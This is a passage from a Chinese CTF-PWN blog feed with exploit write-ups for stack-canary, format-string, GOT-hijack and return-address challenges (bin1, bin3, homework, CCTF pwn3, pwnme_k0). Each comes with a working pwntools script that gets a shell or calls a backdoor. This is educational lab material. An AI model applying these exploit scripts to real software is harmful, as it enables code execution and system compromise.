class="token string">'getflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/2-4.png"></p><h1 id="bin1"><a href="#bin1" class="headerlink" title="bin1"></a>bin1</h1><p>知识点：</p><ul><li>fork循环创建子进程，canary值相同</li><li>爆破canary</li></ul><p>程序开启Canary和NX保护：没啥好说的，跟之前Canary原理篇例子一模一样</p><p><img src="/2023/04/12/canary-jie-ti-pian/3-0.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/3-1.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bin1"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bin1"</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"Checking %d for %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> k<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'welcome\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"sucess"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token keyword">print</span> <span class="token string">'canary: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/3-2.png"></p><h1 id="bin3"><a href="#bin3" class="headerlink" title="bin3"></a>bin3</h1><p>知识点：</p><ul><li>格式化字符串将__stack_chk_fail的got表项内容修改为后门函数</li></ul><p>程序存在格式化字符串漏洞，有后门函数，且只有一次输入输出机会。</p><p>漏洞利用：</p><ul><li>read_n只能读入0x59个字符，刚好溢出到canary</li><li>格式化字符串地址为格式化字符串的第6个参数</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/4-0.png"></p><p>exp：（这里我用fmtstr_payload一直打不通&gt;_&lt;，所以自己手动构造吧</p><blockquote><p>这里我们只需要覆盖低两个字节就行，高字节是相等的</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level='debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin3'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin3'</span><span class="token punctuation">)</span>stack_fail <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span><span class="token comment">#AAAAA%xx ==&gt; 第6个参数</span><span class="token comment">#xxc%8$hn ==&gt; 第7个参数</span><span class="token comment">#p64(stack_fail) ==&gt; 第8个参数</span>payload <span class="token operator">=</span> <span class="token string">'AAAAA'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'backdoor'</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xFFFF</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c'</span> <span class="token operator">+</span> <span class="token string">'%8$hn'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_fail<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/4-1.png"></p><h1 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h1><p>知识点：</p><ul><li>数组下标越界(检查不严格)造成“任意地址”写</li></ul><p>程序开启了Canary和NX保护，存在如下漏洞：</p><ul><li>存在后门函数，数组下标检查不严格</li></ul><p>漏洞利用：</p><ul><li>计算出ret_addr相对于数组的下标（14），然后直接把后门函数写入</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/6.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./homework'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./homework'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name? '</span><span class="token punctuation">,</span> <span class="token string">'XiaozaYa'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'dump'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' &gt; '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'edit: '</span><span class="token punctuation">,</span> <span class="token string">'14'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'many? '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'call_me_maybe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'dump'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' &gt; '</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/6-1.png"></p><blockquote><p>这个题在输入name的时候其实有一个bss溢出漏洞</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canary解题篇章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>partial overwrite</title>
      <link href="/2023/04/11/partial-overwrite/"/>
      <url>/2023/04/11/partial-overwrite/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>partial overwrite 这种技巧在很多地方都适用, 这里是栈上的 partial overwrite 。</p><p>我们知道, 在开启了随机化（ASLR，PIE）后, <strong>无论高位的地址如何变化，低 12 位的页内偏移始终是固定的</strong>, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PIE绕过 </tag>
            
            <tag> 地址随机化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈劫持</title>
      <link href="/2023/04/11/zhan-jie-chi/"/>
      <url>/2023/04/11/zhan-jie-chi/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈迁移 </tag>
            
            <tag> stack pivoting </tag>
            
            <tag> frame faking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串例题</title>
      <link href="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/"/>
      <url>/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h2><p>64位与32 位区别：<strong>64 位函数的前 6 个参数是存储在相应的寄存器中的</strong>。那么在格式化字符串漏洞中，虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p><h3 id="2017-UIUCTF-pwn200-GoodLuck"><a href="#2017-UIUCTF-pwn200-GoodLuck" class="headerlink" title="2017-UIUCTF-pwn200-GoodLuck"></a>2017-UIUCTF-pwn200-GoodLuck</h3><p>64位小端序，开启了Canary和NX</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-1.png"></p><p>程序逻辑如下：</p><ul><li>flag、flag_都是局部变量，是保存在栈中的，所以可以直接利用格式化字符串漏洞将flag给打印出来</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-2.png"></p><p>可以使用fmtarg工具算出flag格式化字符串偏移为：9，所以直接%9$s即可</p><ul><li>使用工具时注意：我们必须 break 在 printf 处。</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-3.png"></p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-4.png"></p><h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><p>wiki:）在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有完全开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p><p>假设我们<strong>将函数 A 的地址覆盖为函数 B 的地址</strong>，那么这一攻击技巧可以分为以下步骤：</p><ul><li><p>确定函数 A 的 GOT 表地址。</p><ul><li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li></ul></li><li><p>确定函数 B 的内存地址</p><ul><li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li></ul></li><li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p><ul><li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p><ul><li>写入函数：write 函数。</li><li>ROP</li></ul><pre class="line-numbers language-none"><code class="language-none">pop eax; ret;           # printf@got -&gt; eaxpop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebxadd [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>格式化字符串任意地址写</li></ul></li></ul></li></ul><h3 id="2016-CCTF-pwn3"><a href="#2016-CCTF-pwn3" class="headerlink" title="2016-CCTF-pwn3"></a>2016-CCTF-pwn3</h3><p>32位小端序，只开了NX保护</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-1.png"></p><p>程序关键说明：</p><ul><li>程序有put，get，show三个功能<ul><li>put：上传一个文件包括name和content</li><li>get：输出指定name文件的content</li><li>show：把所有文件的名字拼接起来然后puts出来（后上传的文件名字在前面</li></ul></li></ul><p>文件在内存中结构如下：</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-3.png"></p><p>漏洞点：</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-2.png"></p><p>我们可以发现get输出文件内容时，直接printf(dest)；</p><p>利用方法：</p><ul><li>利用格式化字符串漏洞任意读打印出puts函数真实地址，从而计算出libc_base</li><li>利用格式化字符串漏洞任意写把puts函数的got表项内容改写为system函数的地址</li><li>然后执行puts(‘/bin/sh;’) ==&gt; system(‘/bin/sh;’) <ul><li>这里把文件名设置为<code>/bin/sh;</code>然后调用show就行，这里加<code>;</code>是因为show会把所有的文件名连起来然后输出，<code>;</code>可以造成截断</li><li>也可以把第一个文件名设置为<code>h</code>,把第二个文件名设置为<code>/bin/s</code>，这样最后合起来就是<code>/bin/sh</code>（亲测可行</li></ul></li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>s <span class="token operator">=</span> <span class="token string">'sysbdmin'</span>p <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>p <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span> pio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'get:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">return</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'put'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'upload:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token comment">#rxraclhm</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%7$s'</span>put<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>get<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>system <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token comment">#fmtstr_payload(offset, {addr:value})</span><span class="token comment">#把addr处的值修改为value,offset为格式化字符串的偏移</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>system<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span> payloadput<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-4.png"></p><h2 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h2><h3 id="三个白帽-pwnme-k0-e"><a href="#三个白帽-pwnme-k0-e" class="headerlink" title="三个白帽 - pwnme_k0 e"></a>三个白帽 - pwnme_k0 e</h3><p>程序RELRO保护全开（无法打got，开启了NX</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-1.png"></p><p>程序功能：</p><ul><li>最开始，注册账号，密码</li><li>选项1：输出账号，密码 – show</li><li>选项2：修改账号，密码 – edit</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-2.png"></p><p>漏洞点：</p><ul><li>输出账号，密码时存在格式化字符串漏洞<ul><li>第一个printf输出账号</li><li>第二个printf输出密码</li></ul></li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-0.png"></p><p>发现程序存在后门：</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-4.png"></p><p>思路：修改返回地址到后门函数处</p><ul><li>泄漏show函数的存储返回地址的栈地址</li><li>修改返回地址为0x4008AA</li></ul><p>动态调试，把断点下在输出密码的printf处，账号输入AAAAAAAA,密码输入BBBBBBBB</p><ul><li>可以看到函数返回地址存储在0x7fffffffdd38处，而rbp（为格式化字符串的第6个参数）里面存储的是栈地址0x7fffffffdd70，虽然栈的地址是变化的，但是两者的偏移是不变的。<ul><li>0x7fffffffdd70 - 0x7fffffffdd38 = 0x38</li></ul></li><li>账号存储在0x7fffffffdd40，为格式化字符串的第8个参数</li><li>密码(格式化字符串)在第10个偏移处</li></ul><p>所以我们可以先用<code>%6$p</code>泄漏处rbp，然后利用<code>rbp-0x38</code>计算出存储返回地址的位置ret_addr，然后修改账号为<code>rer_addr</code>，密码为<code>'%2218c' + '%8$hn'</code>，然后show即可</p><ul><li>可以看到返回地址为0x400d74，system_addr = 0x4008AA ==&gt; 0x40都是一样的，所以我们只需要写入两个字节即写入<code>08AA</code> ==&gt; 2218</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-3.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwnme_k0"</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4008AA</span>payload <span class="token operator">=</span> <span class="token string">'%6$p'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> <span class="token string">'XiaozaYa'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'XiaozaYa\n'</span><span class="token punctuation">)</span>rbp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>ret_addr <span class="token operator">=</span> rbp <span class="token operator">-</span> <span class="token number">0x38</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%2218c'</span> <span class="token operator">+</span> <span class="token string">'%8$hn'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞的利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary攻击原理篇</title>
      <link href="/2023/04/09/canary/"/>
      <url>/2023/04/09/canary/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Canary介绍"><a href="#Canary介绍" class="headerlink" title="Canary介绍"></a>Canary介绍</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p><p>由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。</p><p>Canary 不管是实现还是设计思想都比较简单高效，<strong>就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。</strong></p><p>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">-</span>fstack<span class="token operator">-</span>protector 启用保护，不过只为局部变量中含有字符数组的函数插入保护<span class="token operator">-</span>fstack<span class="token operator">-</span>protector<span class="token operator">-</span>all 启用保护，为所有函数插入保护<span class="token operator">-</span>fstack<span class="token operator">-</span>protector<span class="token operator">-</span>strong<span class="token operator">-</span>fstack<span class="token operator">-</span>protector<span class="token operator">-</span>explicit 只对有明确 stack_protect attribute 的函数开启保护<span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector 禁用保护<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启 Canary 保护的 stack 结构大概如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">       High Address   <span class="token operator">|</span>                 <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>               <span class="token operator">|</span> args            <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>               <span class="token operator">|</span> <span class="token keyword">return</span> address  <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>       rbp <span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token operator">|</span> old ebp         <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span 